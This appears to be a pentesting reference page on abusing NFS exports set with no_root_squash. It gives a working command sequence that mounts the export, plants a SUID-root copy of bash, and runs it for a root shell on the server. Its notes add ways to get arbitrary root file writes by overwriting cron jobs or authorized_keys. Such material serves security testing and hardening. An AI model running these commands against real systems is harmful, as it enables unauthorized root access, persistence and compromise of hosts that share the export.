---
title: "no_root_squash abuse: writing files as root over NFS"
description: "Abusing an NFS export configured with no_root_squash, which lets a mounting client's root be treated as root on the server's files, to plant a root-owned SUID binary on the export and run it on the server for local privilege escalation or to write any file as root."
keywords:
  - no_root_squash
  - NFS privilege escalation
  - SUID binary
  - root file write
  - exports
---

# no_root_squash abuse

By default NFS squashes a remote root to `nobody`, but an export set with `no_root_squash` trusts a client's root as root on the server's files. A client that mounts such an export as its own root can create root-owned files on it, including a SUID-root binary, which then runs with root privileges on the server (or on any host that mounts the same export), turning file-share access into code execution as root.

```bash
# Mount the no_root_squash export as local root
mount -t nfs <target>:/export /mnt/nfs
# Plant a root-owned SUID shell on the export
cp /bin/bash /mnt/nfs/rootbash && chown root:root /mnt/nfs/rootbash && chmod 4755 /mnt/nfs/rootbash
# On the server (or any host mounting it), run it to get root
/export/rootbash -p
```

## Exploitation notes

- The SUID technique needs a foothold on a host that executes files from the export; on the server itself this is local root.
- Even without execution, `no_root_squash` plus write is an arbitrary root file write: overwrite a cron job, authorized_keys, or a config.
- It pairs with [UID and GID spoofing](uid-and-gid-spoofing.md) when you need to act as a specific non-root user instead.

## References

- [man 5 exports](https://man7.org/linux/man-pages/man5/exports.5.html)
- [HackTricks: NFS no_root_squash](https://book.hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.html)
